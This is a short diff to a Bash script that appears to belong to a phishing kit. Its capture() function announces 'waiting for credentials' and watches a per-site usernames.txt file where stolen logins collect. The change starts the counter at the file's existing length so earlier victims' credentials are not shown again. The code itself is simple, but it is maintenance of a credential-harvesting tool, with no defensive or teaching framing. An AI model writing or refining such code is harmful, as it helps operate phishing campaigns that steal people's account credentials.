@@ -138,6 +138,9 @@ capture() {
     printf "${green}[i] ${white}waiting for credentials ...${reset}\n"
     printf "${green}[i] ${white}press ${red}ctrl+c ${white}to stop.${reset}\n"
     local lastcount=0
+    if [[ -f ".sites/$site/usernames.txt" ]]; then
+        lastcount=$(wc -l < ".sites/$site/usernames.txt" 2>/dev/null)
+    fi
     while true; do
         if [[ -f ".sites/$site/usernames.txt" ]]; then
             local currentcount=$(wc -l < ".sites/$site/usernames.txt" 2>/dev/null)
